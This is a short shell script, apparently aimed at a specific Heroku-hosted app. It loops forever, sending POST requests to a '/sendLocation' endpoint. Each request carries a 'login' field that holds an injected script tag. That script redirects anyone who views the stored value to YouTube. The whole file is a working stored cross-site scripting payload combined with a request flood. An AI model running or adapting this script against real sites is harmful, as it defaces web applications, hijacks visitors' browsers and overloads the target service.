while true

do

	curl --data "login=<script> window.location='https://www.youtube.com';</script>&lat=0&lng=0" https://pure-river-81762.herokuapp.com/sendLocation
done
